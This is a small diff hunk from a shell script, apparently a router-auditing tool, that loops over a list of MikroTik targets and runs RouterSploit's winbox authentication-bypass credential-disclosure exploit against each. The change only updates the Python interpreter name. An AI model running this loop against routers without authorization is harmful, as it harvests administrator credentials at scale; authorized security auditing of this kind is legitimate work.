@@ -208,7 +208,7 @@ rtsploit(){
 	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
 		do
 			#winbox_auth_bypass_creds_disclosure
-			WINSAVE=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
+			WINSAVE=$(sudo python3 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
 			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			# routeros_jailbreak
